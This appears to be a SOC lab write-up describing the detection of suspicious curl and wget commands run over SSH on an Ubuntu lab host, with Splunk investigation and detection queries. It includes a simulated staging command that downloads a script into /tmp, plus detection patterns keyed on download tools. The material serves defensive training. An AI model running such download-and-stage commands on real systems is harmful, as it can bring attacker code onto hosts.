
# Scenario 4: Suspicious Command Execution Detection

## Overview
This scenario demonstrates the detection and investigation of suspicious command execution on a Linux host. Commands such as `curl` and `wget` were executed via SSH from an attacker VM, simulating potentially malicious activity.

The objective is to show a realistic SOC workflow:
1. Manual investigation of command execution events
2. Field inspection and identification of suspicious patterns
3. Design of a detection rule suitable for alerting

Note: This scenario was intentionally executed before Scenario 2 and 3 to ensure command execution activity occurred outside defined work hours, enabling more realistic timeline-based analysis.

---

## Lab Environment
- **Attacker VM:** Kali Linux
- **Victim VM:** Ubuntu Server
- **Service:** OpenSSH (sshd)
- **Log Source:** `/var/log/auth.log`
- **SIEM:** Splunk
- **Index:** `main`

---

## Attack Simulation
A successful SSH session was established from the attacker VM into the victim Ubuntu server.
During the session, commonly abused command-line utilities were executed to simulate suspicious post-authentication activity.

Executed commands:
- `curl http://example.com`
- `wget http://example.com -O /tmp/test.sh`

Characteristics of the attack:
- Commands are commonly abused to download remote content
- No payload execution was performed
- Targeted account: `admin`
- All activity was logged in `/var/log/auth.log`

---

## Investigation Phase

### Purpose
The purpose of this phase is to gain visibility into command execution by identifying:
- Which commands were executed
- Under which privilege context
- On which host and at what time

This mirrors a SOC analyst’s initial investigation after detecting suspicious post-login activity.

### Investigation Query
```spl
index=main source="/var/log/auth.log" ("curl" OR "wget")
| table _time host USER _raw
```

### Explanation
- Filters authentication logs for suspicious command keywords
- Displays the full raw log for command context
- Uses the `USER` field to identify the execution privilege

## Outcome
- Confirmed execution of `curl` and `wget` commands
- Identified commands executed under elevated privileges

---

## Detection Phase
### Purpose
Based on the investigation findings, a detection query was created to reliably identify suspicious command execution while minimizing noise from investigative or benign administrative commands.

### Detection Query
```spl
index=main source="/var/log/auth.log" ("curl" OR "wget")
| search NOT ("grep" OR "apt")
| stats count by host USER COMMAND
| where count >= 1
```

### Detection Logic
- Detects usage of commonly abused command-line utilities
- Investigative and package management commands such as `grep` and `apt` were excluded to reduce false positives and focus on potentially malicious command execution.
- Aggregates by host, execution user, and full command
- Suitable for reuse as an alerting rule

This approach prioritizes clarity and reliability over overly complex parsing logic.

---
## Findings
- Detected suspicious command execution events : 2
- Commands observed: `curl`, `wget`
- Execution context: root (via sudo)
- Host affected: Single Ubuntu server

The activity aligns with expected patterns of post-authentication reconnaissance or staging behavior.

---
## Response & Mitigation
- Review executed commands and retrieved files
- Audit sudo usage and privilege escalation paths
- Monitor for repeated or chained command execution

## Notes
- The `USER` field represents the privilege context under which the command was executed, rather than the SSH-authenticated user.
- Investigation and detection queries intentionally differ to reflect real SOC processes.


## Screenshots
Screenshots of Splunk search results and detection output can be found in the `screenshots/` directory.

### Attack Simulation
![Attack Simulation](screenshots/01_attack_simulation.png)

### SSH Authentication Logs
![Auth log](screenshots/02_auth_log_failed_password.png)

### Splunk Raw Events
![Splunk Raw Events](screenshots/03_splunk_raw_events.png)

### Investigation Results 
![Investigation Query](screenshots/04_investigation_query_results.png)

### Investigation Results - rex
![Investigation Query](screenshots/04_investigation_query_results_rex.png)

### Detection Logic
![Detection Logic](screenshots/05_detection_query_aggregation.png)



